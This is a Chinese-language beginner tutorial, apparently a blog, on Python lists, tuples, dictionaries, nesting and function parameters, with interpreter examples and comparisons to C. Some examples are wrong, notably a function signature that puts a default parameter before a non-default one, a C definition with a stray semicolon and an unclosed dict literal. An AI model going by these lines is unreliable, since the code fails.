<h3 id="insert-方法"><a href="#insert-方法" class="headerlink" title="insert()方法"></a>insert()方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(name)</span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>name.insert(<span class="number">2</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(name)</span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br></pre></td></tr></table></figure>
<h2 id="删除元素-1"><a href="#删除元素-1" class="headerlink" title="删除元素"></a>删除元素</h2><table>
<thead>
<tr>
<th align="center">方法/函数</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>del</code>语句</td>
<td align="right">指定删除如何变量或元素字典</td>
</tr>
<tr>
<td align="center"><code>pop()</code>方法</td>
<td align="right">删除指定的元素,如果不指定默认删除最后一个,他返回被删除的值</td>
</tr>
<tr>
<td align="center"><code>remove()</code>方法</td>
<td align="right">指定元素内容删除</td>
</tr>
</tbody></table>
<h3 id="del语句"><a href="#del语句" class="headerlink" title="del语句"></a>del语句</h3><p>指定删除如何变量或元素字典</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(name)</span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> name[<span class="number">1</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(name)</span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br></pre></td></tr></table></figure>
<p>如果不指定</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> name</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(name)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">&#x27;name&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br></pre></td></tr></table></figure>
<p>指定删除变量</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name=<span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> name</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(name)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">&#x27;name&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br></pre></td></tr></table></figure>


<h3 id="pop-方法"><a href="#pop-方法" class="headerlink" title="pop()方法"></a>pop()方法</h3><p>删除指定的元素,如果不指定默认删除最后一个,他返回被删除的值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;name=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line">&gt;&gt;&gt;name.pop()</span><br><span class="line">&gt;&gt;&gt;print(name)</span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p><strong>查看他的返回值</strong></p>
<p>可以看见他的值是c,就是叫c给删除了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(name.pop())</span><br><span class="line">c</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br></pre></td></tr></table></figure>
<p><strong>指定删除</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>name.pop(<span class="number">1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(name)</span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;c&#x27;</span>]</span><br></pre></td></tr></table></figure>
<h3 id="remove-方法"><a href="#remove-方法" class="headerlink" title="remove()方法"></a>remove()方法</h3><p>指定元素内容删除</p>
<p>如果下面有多个b他只会删除第一个b</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>name.remove(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(name)</span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;c&#x27;</span>]</span><br></pre></td></tr></table></figure>
<h1 id="列表排序-1"><a href="#列表排序-1" class="headerlink" title="列表排序"></a>列表排序</h1><table>
<thead>
<tr>
<th align="center">方法/函数</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>sort()</code>方法</td>
<td align="right">他会按大小进行排序，他是永久性的</td>
</tr>
<tr>
<td align="center"><code>sorted()</code>函数</td>
<td align="right">他会按大小进行排序，他是临时排序的</td>
</tr>
<tr>
<td align="center"><code>reverse()</code>方法</td>
<td align="right">倒着排序</td>
</tr>
</tbody></table>
<h2 id="sort-方法"><a href="#sort-方法" class="headerlink" title="sort()方法"></a>sort()方法</h2><p>他会按大小进行排序，<strong>他是永久性的</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name=[<span class="string">&#x27;caa&#x27;</span>,<span class="string">&#x27;bcc&#x27;</span>,<span class="string">&#x27;add&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>name.sort()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(name)</span><br><span class="line">[<span class="string">&#x27;add&#x27;</span>, <span class="string">&#x27;bcc&#x27;</span>, <span class="string">&#x27;caa&#x27;</span>]</span><br></pre></td></tr></table></figure>
<h2 id="sorted-函数"><a href="#sorted-函数" class="headerlink" title="sorted()函数"></a>sorted()函数</h2><p>记住他是函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name=[<span class="string">&#x27;caa&#x27;</span>,<span class="string">&#x27;bcc&#x27;</span>,<span class="string">&#x27;add&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(sorted(name))</span><br><span class="line">[<span class="string">&#x27;add&#x27;</span>, <span class="string">&#x27;bcc&#x27;</span>, <span class="string">&#x27;caa&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br></pre></td></tr></table></figure>
<p>他会按大小进行排序，他是临时排序的</p>
<h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse()"></a>reverse()</h2><p>倒着排序</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>name.reverse()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(name)</span><br><span class="line">[<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;a&#x27;</span>]</span><br></pre></td></tr></table></figure>
<h1 id="列表长度"><a href="#列表长度" class="headerlink" title="列表长度"></a>列表长度</h1><p>用的是<code>len()</code>函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(len(name))</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>
<h1 id="列表统计"><a href="#列表统计" class="headerlink" title="列表统计"></a>列表统计</h1><table>
<thead>
<tr>
<th align="center">函数</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>min()</code>函数</td>
<td align="right">输出最小的元素</td>
</tr>
<tr>
<td align="center"><code>max(min)</code>函数</td>
<td align="right">输出最大的元素</td>
</tr>
<tr>
<td align="center"><code>sum()</code>方法</td>
<td align="right">输出元素的综合</td>
</tr>
</tbody></table>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>min(name)</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>max(name)</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sum(name)</span><br><span class="line"><span class="number">6</span></span><br></pre></td></tr></table></figure>
<h1 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(name[<span class="number">2</span>:])</span><br><span class="line">[<span class="number">3</span>, <span class="number">4</span>]</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(name[:<span class="number">3</span>])</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(name[<span class="number">-3</span>:])</span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br></pre></td></tr></table></figure>
<h1 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h1><p>元组就是一个不能改的列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name=(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>name[<span class="number">0</span>]=<span class="number">1</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: <span class="string">&#x27;tuple&#x27;</span> object does <span class="keyword">not</span> support item assignment</span><br></pre></td></tr></table></figure>
<h1 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h1><p><strong>python的字典声明</strong></p>
<p>下面name这个叫键，123叫值</p>
<p>下面age这个叫键，18叫值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name=&#123;<span class="string">&#x27;num&#x27;</span>:<span class="number">123</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">18</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(name[<span class="string">&#x27;num&#x27;</span>])</span><br><span class="line"><span class="number">123</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(name[<span class="string">&#x27;age&#x27;</span>])</span><br><span class="line"><span class="number">18</span></span><br></pre></td></tr></table></figure>


<p><strong>python的字典有点点与c的结构体差不多</strong></p>
<p><strong>c语言的结构体声明</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">name</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> name;  <span class="comment">//姓名</span></span><br><span class="line">    <span class="keyword">int</span> num;  <span class="comment">//学号</span></span><br><span class="line">    <span class="keyword">int</span> age;  <span class="comment">//年龄</span></span><br><span class="line">    <span class="keyword">char</span> group;  <span class="comment">//所在学习小组</span></span><br><span class="line">    <span class="keyword">float</span> score;  <span class="comment">//成绩</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>python的字典声明</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name=&#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;wsdx&#x27;</span>,<span class="string">&#x27;num&#x27;</span>:<span class="number">123</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">18</span>&#125;</span><br></pre></td></tr></table></figure>
<h2 id="添加键值对"><a href="#添加键值对" class="headerlink" title="添加键值对"></a>添加键值对</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name=&#123;<span class="string">&#x27;num&#x27;</span>:<span class="number">123</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">18</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>name[<span class="string">&#x27;name&#x27;</span>]=<span class="string">&#x27;张三&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(name)</span><br><span class="line">&#123;<span class="string">&#x27;num&#x27;</span>: <span class="number">123</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;张三&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
<h2 id="删除键值对"><a href="#删除键值对" class="headerlink" title="删除键值对"></a>删除键值对</h2><table>
<thead>
<tr>
<th align="center">方法/函数</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>del</code>语句</td>
<td align="right">指定删除如何变量或元素字典</td>
</tr>
</tbody></table>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name=&#123;<span class="string">&#x27;num&#x27;</span>:<span class="number">123</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">18</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> name[<span class="string">&#x27;num&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(name)</span><br><span class="line">&#123;<span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br></pre></td></tr></table></figure>
<h2 id="遍历键值对"><a href="#遍历键值对" class="headerlink" title="遍历键值对"></a>遍历键值对</h2><table>
<thead>
<tr>
<th align="center">方法/函数</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>items()</code>方法</td>
<td align="right">返回值返回可遍历的键, 值列表</td>
</tr>
</tbody></table>
<p>返回值返回可遍历的键, 值列表</p>
<p><strong>查看他的返回键, 值列对表</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name=&#123;<span class="string">&#x27;num&#x27;</span>:<span class="number">123</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">18</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(name.items())</span><br><span class="line">dict_items([(<span class="string">&#x27;num&#x27;</span>, <span class="number">123</span>), (<span class="string">&#x27;age&#x27;</span>, <span class="number">18</span>)])</span><br></pre></td></tr></table></figure>
<p><strong>遍历键值对</strong></p>
<p>a存储的是键，b存储的是值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name=&#123;<span class="string">&#x27;num&#x27;</span>:<span class="number">123</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">18</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> a,b <span class="keyword">in</span> name.items():</span><br><span class="line"><span class="meta">... </span>	print(<span class="string">&quot;键是&quot;</span>+str(a)+<span class="string">&quot;值是&quot;</span>+str(b))</span><br><span class="line">键是num值是<span class="number">123</span></span><br><span class="line">键是age值是<span class="number">18</span></span><br></pre></td></tr></table></figure>
<h2 id="遍历键"><a href="#遍历键" class="headerlink" title="遍历键"></a>遍历键</h2><table>
<thead>
<tr>
<th align="center">方法/函数</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>keys()</code>方法</td>
<td align="right">返回值返回可遍历的键列表</td>
</tr>
</tbody></table>
<p><strong>他的返回</strong></p>
<p>可以看见他返回的里面的键</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name=&#123;<span class="string">&#x27;num&#x27;</span>:<span class="number">123</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">18</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(name.keys())</span><br><span class="line">dict_keys([<span class="string">&#x27;num&#x27;</span>, <span class="string">&#x27;age&#x27;</span>])</span><br></pre></td></tr></table></figure>
<p><strong>遍历键</strong></p>
<p>for只需要一个a变量就可以了应为他就一个</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name=&#123;<span class="string">&#x27;num&#x27;</span>:<span class="number">123</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">18</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> a <span class="keyword">in</span> name.keys(): </span><br><span class="line"><span class="meta">... </span>    print(a)</span><br><span class="line">num</span><br><span class="line">age</span><br></pre></td></tr></table></figure>
<h2 id="遍历值"><a href="#遍历值" class="headerlink" title="遍历值"></a>遍历值</h2><table>
<thead>
<tr>
<th align="center">方法/函数</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>values()</code>方法</td>
<td align="right">返回值返回可遍历的值列表</td>
</tr>
</tbody></table>
<p><strong>他的返回</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name=&#123;<span class="string">&#x27;num&#x27;</span>:<span class="number">123</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">18</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(name.values())</span><br><span class="line">dict_values([<span class="number">123</span>, <span class="number">18</span>])</span><br></pre></td></tr></table></figure>


<p><strong>遍历值</strong></p>
<p>for只需要一个a变量就可以了应为他就一个</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name=&#123;<span class="string">&#x27;num&#x27;</span>:<span class="number">123</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">18</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> a <span class="keyword">in</span> name.values(): </span><br><span class="line"><span class="meta">... </span>    print(a)</span><br><span class="line"><span class="number">123</span></span><br><span class="line"><span class="number">18</span></span><br></pre></td></tr></table></figure>
<h1 id="嵌套"><a href="#嵌套" class="headerlink" title="嵌套"></a>嵌套</h1><p>这个嵌套就是字典里面套列表，列表里面套字典等等</p>
<h2 id="字典列表"><a href="#字典列表" class="headerlink" title="字典列表"></a>字典列表</h2><p>列表里面套字典，就是列表里面是字典</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name=&#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">123</span>,<span class="string">&#x27;b&#x27;</span>:<span class="number">18</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>name2=&#123;<span class="string">&#x27;c&#x27;</span>:<span class="number">123</span>,<span class="string">&#x27;d&#x27;</span>:<span class="number">18</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>name3=[name,name2]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(name3)</span><br><span class="line">[&#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">123</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">18</span>&#125;, &#123;<span class="string">&#x27;c&#x27;</span>: <span class="number">123</span>, <span class="string">&#x27;d&#x27;</span>: <span class="number">18</span>&#125;]</span><br></pre></td></tr></table></figure>
<p><strong>指定输出</strong></p>
<p>我们我们想输出a里面的值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name=&#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">123</span>,<span class="string">&#x27;b&#x27;</span>:<span class="number">18</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>name2=&#123;<span class="string">&#x27;c&#x27;</span>:<span class="number">123</span>,<span class="string">&#x27;d&#x27;</span>:<span class="number">18</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>name3=[name,name2]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(name3[<span class="number">0</span>][<span class="string">&#x27;a&#x27;</span>])</span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure>


<h2 id="列表字典"><a href="#列表字典" class="headerlink" title="列表字典"></a>列表字典</h2><p>字典里面套列表，就是字典里面的值是列表</p>
<p><strong>注意是值不是键</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>name2=[<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>name3=&#123;<span class="string">&#x27;num&#x27;</span>:name,<span class="string">&#x27;age&#x27;</span>:name2&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(name3)</span><br><span class="line">&#123;<span class="string">&#x27;num&#x27;</span>: [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>], <span class="string">&#x27;age&#x27;</span>: [<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>]&#125;</span><br></pre></td></tr></table></figure>
<p><strong>指定输出</strong></p>
<p>我们我们想输出a</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>name2=[<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>name3=&#123;<span class="string">&#x27;num&#x27;</span>:name,<span class="string">&#x27;age&#x27;</span>:name2&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(name3[<span class="string">&#x27;num&#x27;</span>][<span class="number">0</span>])</span><br><span class="line">a</span><br></pre></td></tr></table></figure>
<h2 id="字典套字典"><a href="#字典套字典" class="headerlink" title="字典套字典"></a>字典套字典</h2><p>字典套字典，就是字典里面的值是字典</p>
<p><strong>注意是值不是键</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name=&#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">123</span>,<span class="string">&#x27;b&#x27;</span>:<span class="number">18</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>name2=&#123;<span class="string">&#x27;c&#x27;</span>:<span class="number">123</span>,<span class="string">&#x27;d&#x27;</span>:<span class="number">18</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>name3=&#123;<span class="string">&#x27;unm&#x27;</span>:name,<span class="string">&#x27;age&#x27;</span>:name2&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(name3)</span><br><span class="line">&#123;<span class="string">&#x27;unm&#x27;</span>: &#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">123</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">18</span>&#125;, <span class="string">&#x27;age&#x27;</span>: &#123;<span class="string">&#x27;c&#x27;</span>: <span class="number">123</span>, <span class="string">&#x27;d&#x27;</span>: <span class="number">18</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><strong>指定输出</strong></p>
<p>指定输出指定字典unm键里面的a键里面的值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name=&#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">123</span>,<span class="string">&#x27;b&#x27;</span>:<span class="number">18</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>name2=&#123;<span class="string">&#x27;c&#x27;</span>:<span class="number">123</span>,<span class="string">&#x27;d&#x27;</span>:<span class="number">18</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>name3=&#123;<span class="string">&#x27;unm&#x27;</span>:name,<span class="string">&#x27;age&#x27;</span>:name2</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(name3[<span class="string">&#x27;unm&#x27;</span>][<span class="string">&#x27;a&#x27;</span>])</span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure>
<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><p>Python和C语言的差别</p>
<p>c语言定义</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Func</span><span class="params">(形参)</span></span>;</span><br><span class="line">&#123;</span><br><span class="line">    .....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>python定义</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Func</span>(<span class="params">形参</span>):</span></span><br><span class="line">    .....</span><br></pre></td></tr></table></figure>
<h2 id="默认值"><a href="#默认值" class="headerlink" title="默认值"></a>默认值</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Func</span>(<span class="params">a=<span class="string">&#x27;1234&#x27;</span>,b</span>):</span></span><br><span class="line">    .....</span><br></pre></td></tr></table></figure>
<h2 id="任何数量参数传递"><a href="#任何数量参数传递" class="headerlink" title="任何数量参数传递"></a>任何数量参数传递</h2><p>他就定义一个unm形参前面加一个*就会接受然后实参，然后变成元祖</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">name</span>(<span class="params">*unm</span>):</span></span><br><span class="line">    print(unm)</span><br><span class="line"></span><br><span class="line">name(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&#39;a&#39;, &#39;b&#39;, &#39;c&#39;)</span><br></pre></td></tr></table></figure>


<h2 id="任何数量关键字实参"><a href="#任何数量关键字实参" class="headerlink" title="任何数量关键字实参"></a>任何数量关键字实参</h2><p>他就定义一个unm形参前面加一个**就会接受然后键字实参实参，然后变成字典</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">name</span>(<span class="params">**unm</span>):</span></span><br><span class="line">    print(unm)</span><br><span class="line"></span><br><span class="line">name(a=<span class="string">&#x27;a&#x27;</span>,b=<span class="string">&#x27;b&#x27;</span>,c=<span class="string">&#x27;c&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>结果</p>
